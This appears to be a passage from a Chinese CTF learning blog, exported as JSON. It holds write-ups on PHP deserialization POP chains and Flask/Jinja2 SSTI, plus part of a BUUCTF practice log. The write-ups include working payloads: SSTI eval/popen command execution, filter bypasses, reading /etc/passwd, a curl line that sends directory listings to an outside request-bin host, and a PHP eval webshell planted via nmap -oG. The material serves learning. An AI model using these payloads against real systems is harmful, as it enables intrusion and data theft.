可以用https://或git://或ssh传输协议 查看连接的仓库地址 git remote -v 如果在另外的文件夹提交需重新进行一遍图中步骤 还要再push前输入 git pull --rebase origin main 该命令的意思是把远程库中的更新合并到（pull=fetch+merge）本地库中，–-rebase的作用是取消掉本地库中刚刚的commit，并把他们接到更新后的版本库之中。出现如下图执行pull执行成功后，可以成功执行git push origin main操作。 否则就会因为本地库与远程库不一致导致报错","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"反序列化","slug":"反序列化","date":"2021-06-29T16:19:02.000Z","updated":"2022-03-28T08:21:06.555Z","comments":true,"path":"2021/06/30/反序列化/","link":"","permalink":"https://ethe448.github.io/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数 serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法","text":"基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数 serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法 几个常见的魔术方法 __construct： 在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct： 和构造函数相反，当对象所在函数调用完毕后执行。 __toString：当对象被当做一个字符串使用时调用。 __sleep:序列化对象之前就调用此方法(其返回需要一个数组) __wakeup:反序列化恢复对象之前调用该方法 __call:当调用对象中不存在的方法会自动调用该方法。 __get:在调用私有属性的时候会自动执行 __isset()在不可访问的属性上调用isset()或empty()触发 __invoke() 当尝试把对象当方法调用时调用。 __unset()在不可访问的属性上使用unset()时触发 格式 O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125; 类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125; 序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 private类型有隐藏的空格符 反序列化的常见起点 __wakeup 一定会调用 __destruct 一定会调用 __toString 当一个对象被反序列化后又被当做字符串使用 反序列化的常见中间跳板: __toString 当一个对象被当做字符串使用__get 读取不可访问或不存在属性时被调用__set 当给不可访问或不存在属性赋值时被调用__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func(); 反序列化的常见终点: __call 调用不可访问或不存在的方法时被调用call_user_func 一般php代码执行都会选择这里call_user_func_array 一般php代码执行都会选择这里 POP链简介借鉴的文章： php反序列化利用——POP链构造实例 - 简书 (jianshu.com) (1条消息) PHP反序列化—构造POP链_Lemon&#39;s blog-CSDN博客_php反序列化pop链 POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。 POP链利用技巧1、一些有用的POP链中出现的方法： - 命令执行：exec()、passthru()、popen()、system() - 文件操作：file_put_contents()、file_get_contents()、unlink() 2、反序列化中为了避免信息丢失，使用大写S支持字符串的编码。PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这 个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即： s:4:\"user\"; -> S:4:\"use\\72\"; 3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。 4、配合PHP伪协议实现文件包含、命令执行等漏洞。 wp先贴俩之前写的简单的 [ZJCTF 2019]NiZhuanSiWei 看见file_get_contents(),利用伪协议data://text/plain;base64绕过 再利用php://filter读取useless内的内容 解码后 可知flag在flag.php中 试图让file=flag.php 看到unserialize函数，利用php反序列化 构造payload ？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 查看源码找到flag [极客大挑战 2019]PHP页面中提示有备份文件，御剑扫一遍 找到存在www.zip 重点在class.php和index.php中 所以要传入一个select参数，利用反序列化让username=admin password=100 因为username和password两个为private类型 所以有隐藏的空格符 select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot; [MRCTF2020]Ezpop题目源码 class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125; &#125; class Show&#123; public $source; public $str; public function __construct($file&#x3D;&#39;index.php&#39;)&#123; $this-&gt;source &#x3D; $file; echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source &#x3D; &quot;index.php&quot;; &#125; &#125; &#125; class Test&#123; public $p; public function __construct()&#123; $this-&gt;p &#x3D; array(); &#125; public function __get($key)&#123; $function &#x3D; $this-&gt;p; return $function(); &#125; &#125; if(isset($_GET[&#39;pop&#39;]))&#123; @unserialize($_GET[&#39;pop&#39;]); &#125; else&#123; $a&#x3D;new Show; highlight_file(__FILE__); &#125; 题目里出现的魔术变量 __construct 当一个对象创建时被调用， __toString 当一个对象被当作一个字符串被调用。 __wakeup() 使用unserialize时触发 __get() 用于从不可访问的属性读取数据 #难以访问包括：（1）私有属性，（2）没有初始化的属性 __invoke() 当脚本尝试将对象调用为函数时触发 这里可以看出来首先要get进一个pop值，并进行反序列化，所以就会调用__wakeup()这个方法_ __wakeup()中里利用preg_match对传入的值进行过滤，但如果this-&gt;source是show类，就会调用__toString 这里会返回$this-&gt;str-&gt;source，但如果没有source这个属性，接下来就会调用__get()，然后会将对象调用为函数， 这里也就会触发__invoke()，进而调用append 在append的中存在include，所以可以利用文件包含漏洞读到flag payload （自己写一个还是有点困难 &lt;?php class Modifier &#123; protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;; &#125; class Show &#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source &#x3D; $file; &#125; &#125; class Test &#123; public $p; &#125; $a &#x3D; new Show(&#39;aaa&#39;); $a-&gt;str &#x3D; new Test(); $a-&gt;str-&gt;p &#x3D; new Modifier(); $b &#x3D; new Show($a); echo urlencode(serialize($b)); base64解码拿到flag CODE REVIEW 代码审计可以看出这里首先要先get进pleaseget=1然后post进pleasepost，md51，md52和obj四个值，而obj这里存在反序列化的漏洞 且当if($this-&gt;correct === $this-&gt;input)成立时就会打印出flag 这里同时要求传入的md51和md52的md5值相等，且自身不相等，由于md5不能处理数组，所以传入数组的返回值都为null 而因为$this-&gt;correct这里进行了编码，所以要使if语句成立在构造payload时可以采用引用赋值的方法 构造payload //uniqid() :函数基于以微秒计的当前时间，生成一个唯一的 ID。 //传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。 //引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。 所以最终payload为 get内容为：?pleaseget=1 post内容为：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;} 拿到flag [网鼎杯 2020 青龙组]AreUSerialz源码 &lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op &#x3D; &quot;1&quot;; $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;; $content &#x3D; &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123; $res &#x3D; $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res &#x3D; &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res &#x3D; file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;) $this-&gt;op &#x3D; &quot;1&quot;; $this-&gt;content &#x3D; &quot;&quot;; $this-&gt;process(); &#125; &#125; function is_valid($s) &#123; for($i &#x3D; 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125)) return false; return true; &#125; if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123; $str &#x3D; (string)$_GET[&#39;str&#39;]; if(is_valid($str)) &#123; $obj &#x3D; unserialize($str); &#125; &#125; 看到unserialize可以很容易想到反序列化，源码里还有file_get_contents，所以猜测这题是利用反序列化通过文件包含读取flag，利用php://filter来造成任意文件读取 在传入后还存在一个is__valid()函数的过滤，要求传入内容的ascii码在32到123之内 之后进行反序列化，由于要利用file_get_contents()读取flag，并将其打印出来，所以需要让op=2，执行read()中的内容 构造payload 这里因为protect进行反序列化时会出现特殊符号，导致无法通过is__valid函数的过滤，可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。 ?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; （刚开始给op赋了个字符型的“2”，找错找了半天。。。 拿到flag 接下来base64解码就可以拿到flag了 这周划水了（ 忙着学科目三了，周三考完试再补点（","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"ssti模板注入","slug":"ssti模板注入","date":"2021-06-25T04:19:20.000Z","updated":"2022-04-25T12:57:16.240Z","comments":true,"path":"2021/06/25/ssti模板注入/","link":"","permalink":"https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。","text":"不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。 ssti概述贴个大佬的文章 浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com) CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com) [关于python魔术方法payload：““.class.mro2].subclasses()40.read() 的解释_xiao__1bai的博客-CSDN博客 模板注入总结_Herbert_555的博客-CSDN博客 SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{ { } }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。 flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数 __dict__ 保存类实例或对象实例的属性变量键值对字典 __class__ 返回类型所属的对象 __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __bases__ 返回该对象所继承的基类 &#x2F;&#x2F; __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 __init__ 类的初始化方法 __globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 flask基本知识 flask采用装饰器来指定路由，默认的模板渲染引擎为Jinja2。其中模板的三种主要语法为 ：装载一个变量，渲染模板的时候，可以传入变量名和变量值模板会自动替换变量为传入的变量值 { % … % }:装载一个控制语句 :装载一个注释 流程： ​ 获取基本类 ​ 获取基本类的子类 ​ 找到重载过的__init__类 ​ 查看其引用__builtins__ ​ 调用其中可用的函数 获取基本类 ​ 利用__bases__或者是__mro__函数 &#39;&#39;.__class__.__mro__[2] &#123;&#125;.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用 //实话实说最后一个不是很懂 获取基类的子类 ​ 利用__subclasses__函数 object.__subclasses__() &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;这句可以查找所有的类 SSTI的主要目的就是从这么多子类中找出可以利用的类（一般是指读写文件的类）加以利用 我们可以利用的方法有&lt;type &#39;file&#39;&gt;等，（一般file在第40号） 找到重载过的__init__类 &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__ &lt;unbound method WarningMessage.__init__ &#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings) 可以查看当前位置， 查看其引用__builtins__ &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;] 使用os模块执行命令来读取flag或者执行命令 &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) &#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125; 来、姿势 1、config &#123;&#123;config&#125;&#125;可以获取当前 &#123;&#123;config&#125;&#125;可以获取当前设置，如果题目类似app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;），那可以直接访问&#123;&#123;config['FLAG']&#125;&#125;或者&#123;&#123;config.FLAG&#125;&#125;得到flag 2、self &#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt; &#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config 3、&quot;&quot;、[]、()等数据结构 主要目的是配合__class__.__mro__[2]这样找到object类&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125; 4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等 如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。 例如： &#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125; &#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125; &#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125; 常见的过滤绕过 (1)只过滤[] pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()若.也被过滤，使用原生JinJa2函数|attr()将request.__class__改成request|attr(&quot;__class__&quot;) (2)过滤_ 利用request.args属性&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__将其中的request.args改为request.values则利用post的方式进行传参 (3)关键字过滤 base64编码绕过__getattribute__使用实例访问属性时,调用该方法 例如被过滤掉__class__关键词&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()&#125;&#125; 字符串拼接绕过&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()&#125;&#125;&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125; (4)过滤{ { 使用&#123;% if ... %&#125;1&#123;% endif %&#125;，例如 &#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; | grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125; 如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来 &#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125; (5)引号内十六进制绕过 &#123;&#123;&quot;&quot;.__class__&#125;&#125; &#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;]&#125;&#125; _&#96;是&#96;\\x5f&#96;，&#96;.&#96;是&#96;\\x2E (6)&quot; &#39; chr等被过滤，无法引入字符串 直接拼接键名 dict(buil&#x3D;aa,tins&#x3D;dd)|join() 利用string、pop、list、slice、first等过滤器从已有变量里面直接找 (app.__doc__|list()).pop(102)|string() 构造出%和c后，用格式化字符串代替chr &#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join %&#125; # uld&#x3D;%c &#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125; (7)+等被过滤，无法拼接字符串 ~在jinja中可以拼接字符串 格式化字符串同上 例一：warnings.catch_warnings类 &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’] 最后获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125; 例二： class’site._Printer’类 &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; 获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125; 例三：popen &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125; wp搭了个靶场 level 1先找基本类 再获取基本类的子类 找到重载过的__init__类 &#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125; 查看其引用__builtins__ 利用eval命令执行来读取flag &#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125; level 2这个过滤了{ { ，所以要采用{ % % }的形式 { % % }内加控制语句 且这里展示数据要利用{ % print % } &#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125; 还有一种是利用控制语句 寻找符合条件的子类再利用WarningMessage的__bulitins__执行代码这个还不太懂先贴一下payload &#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125; 补: &#123;%if sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125; 要利用&lt;class ‘warnings.catch_warnings’&gt;来调用eval os等命令&lt;class ‘warnings.catch_warnings’&gt;一般位置为59，可以用它来调用file、os、eval、commands等 调用file &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() #把 read() 改为 write() 就是写文件 import os [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read() 调用eval [].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;) 调用system方法。（不包含system，可以绕过过滤system的情况） [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;) 利用commands进行命令执行 &#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125; level 3在学了在学了（ [GYCTF2020]FlaskApp题目里有base64加密、解密和一个提示页面，试一下就可以知道解密框存在ssti注入，且当报错时会进入debug模式在这里可以看到一部分源码 试着访问app。py &#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 这里可以看到过滤了一些内容 再查找目录内内容 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。 看见一个this_is_the_flag.txt 尝试去访问,得到flag &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125; &#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 也可以利用切片的方式 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"ssti注入","slug":"ssti注入","permalink":"https://ethe448.github.io/tags/ssti%E6%B3%A8%E5%85%A5/"}]},{"title":"buu刷题记录","slug":"buu刷题记录","date":"2021-06-16T20:26:18.000Z","updated":"2022-04-28T07:32:16.172Z","comments":true,"path":"2021/06/17/buu刷题记录/","link":"","permalink":"https://ethe448.github.io/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"记录一下自己buu的刷题进度，留下点wp方便以后看","text":"记录一下自己buu的刷题进度，留下点wp方便以后看 [HCTF 2018]WarmUp 进入后看到滑稽表情，查看源码看到有source.php 看到php代码 要求传入一个字符串类型的file，且需满足class emmm中的条件 &lt;?php ?&gt; -oG 1.php &#39; 然后经过escapeshellarg和escapeshellcmd两个函数就会变成类似这种 &#39; &#39;\\\\&#39;&#39;\\&lt;\\?php eval\\(\\)\\;\\?\\&gt; -oG 1.php &#39;\\\\&#39;&#39; &#39; 这里单引号都闭合了不会影响到传入的一句话木马 之后就可以用菜刀连接找flag了 e9612257fa1c5134d014e95a7440d357 这是上传后的地址 菜刀连一下http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/ e9612257fa1c5134d014e95a7440d357/1.php 根目录找到flag [RoarCTF 2019]Easy Java首先是个登录框 看一下help的内容 试试抓包然后改一下请求方式后会下载一个word文档，没啥用 这里有个漏洞WEB-INF/web.xml泄露 WEB-INF主要包含一下文件或目录: &#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 &#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 &#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 &#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。 &#x2F;WEB-INF&#x2F;database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 漏洞成因 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; 或者return 404; 或者其他！ 漏洞利用 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 所以先访问一下WEB-INF/web.xml 这个路径com.wm.ctf.IndexController应该和flag有关 所以试试访问一下 看到有块类似base64 解码得到flag [GXYCTF2019]禁止套娃[(1条消息) BUU-WEB-GXYCTF2019]禁止套娃_TzZzEZ-web的博客-CSDN博客 [GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com) 题目存在git泄露，用GitHack扫一下得到源码 可以猜到这里利用了eval进行命令执行，但是过滤了很多东西 1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 2.过滤了常用的几个伪协议，不能以伪协议读取文件。 3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 4.正则匹配掉了et&#x2F;na&#x2F;info等关键字，很多函数都用不了。 5：eval($_GET[&#39;exp&#39;]); 典型的无参数RCE PHP Parametric Function RCE · 